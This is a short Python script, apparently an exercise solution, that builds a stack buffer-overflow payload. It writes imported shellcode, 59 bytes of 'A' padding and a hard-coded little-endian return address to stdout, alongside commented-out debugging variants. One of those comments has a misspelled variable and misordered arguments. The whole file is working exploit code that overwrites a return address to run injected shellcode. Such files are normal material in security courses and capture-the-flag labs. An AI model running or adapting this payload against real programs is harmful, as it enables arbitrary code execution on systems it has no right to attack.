from shellcode import shellcode
import sys
#sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(shellcode + (b"\x41" * 59) + b"\xf8\xe8\xf6\xff")
#gdb sys.stdout.buffer.write(b"\x90" + shellcode) + adddress.to_bytes("little",4))
#print(len(shellcode))